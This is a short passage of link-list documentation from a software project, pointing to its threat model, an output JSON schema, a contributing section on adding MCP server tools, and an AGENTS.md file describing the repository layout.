- [`docs/security/threat-model.md`](security/threat-model.md) — full attack-surface analysis, mitigations, and acknowledged gaps
- [`docs/output-schemas.md`](output-schemas.md) — the JSON schema for tool outputs (CI integration)
- [`CONTRIBUTING.md`](../CONTRIBUTING.md) §"Adding an MCP server tool" — security rubric for new tools
- [`AGENTS.md`](../AGENTS.md) — repo layout + AI-fill loop description
